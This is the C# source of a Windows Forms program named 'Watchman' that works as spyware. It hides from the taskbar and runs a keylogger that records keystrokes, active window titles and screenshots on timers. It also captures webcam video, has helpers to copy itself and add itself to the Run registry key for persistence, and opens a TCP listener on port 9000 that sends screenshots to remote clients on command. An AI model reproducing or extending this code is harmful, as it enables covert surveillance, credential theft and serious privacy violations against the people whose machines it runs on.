using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Watchman
{
    public partial class Form1 : Form
    {
        private static readonly Socket _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private static readonly List<Socket> _clientSockets = new List<Socket>();
        private static readonly byte[] _buffer = new byte[1024];
        private Camera _cam;
        private KLog _keylog;

        public Form1()
        {
            InitializeComponent();
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any,9000));
            _serverSocket.Listen(1);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }
        

        private void Form1_Load(object sender, EventArgs e)
        {



            //this.Hide();
            //this.Opacity = 0;
            ShowInTaskbar = false;
            
            timer1.Enabled = true; 
            timer2.Enabled = true;
            timer3.Enabled = true;
            timer4.Enabled = true;

            _keylog = new KLog();
            _cam = new Camera();
            _cam.Connect(pictureBox1, _cam.Devices[0]);
        }

        private void CopyApplication(string location)
        {
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
            if (File.Exists(filePath)) File.Delete(filePath);
            File.Copy(filePath, location);
        }

        private void AddToStartUp()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp != null && rkApp.GetValue("WatchMan") == null)
                rkApp.SetValue("WatchMan", Application.ExecutablePath);
        }

        #region Time Tickers
        private void timer1_Tick(object sender, EventArgs e)
        {
            _keylog.Log();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            _keylog.ActiveWindow();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            _keylog.WriteLog();
            _keylog.TakeScreen();
        }
        #endregion

        #region Click events

        private void button1_Click(object sender, EventArgs e)
        {
            _cam.Record();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            _cam.StopRecord();
        }

        #endregion

        #region Remote
        private static void AcceptCallback(IAsyncResult iar)
        {
            Socket socket = _serverSocket.EndAccept(iar);
            _clientSockets.Add(socket);
            socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);

            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        private static void ReceiveCallback(IAsyncResult iar)
        {
            try
            {
                Socket socket = (Socket) iar.AsyncState;
                int received = socket.EndReceive(iar);
                byte[] dataBuffer = new byte[received];

                Array.Copy(_buffer, dataBuffer, received);
                //Text received
                string text = Encoding.ASCII.GetString(dataBuffer);

                byte[] data = null;
                if (text.ToLower() == "screen capture")
                {
                    data = KLog.RemoteTakeScreen();
                }
                else
                {
                    data = Encoding.ASCII.GetBytes("Unknown request");
                }

                //Do your thing then
                socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback),
                                    socket);
            }
            catch (ObjectDisposedException e)
            {
                Console.WriteLine(e.Message);
            }
            catch (SocketException ex)
            {
                Console.WriteLine(ex.Message);
            }
            
        }

        private static void SendCallback(IAsyncResult iar)
        {
            Socket socket = (Socket) iar.AsyncState;
            socket.EndSend(iar);
        }
        #endregion
    }
}
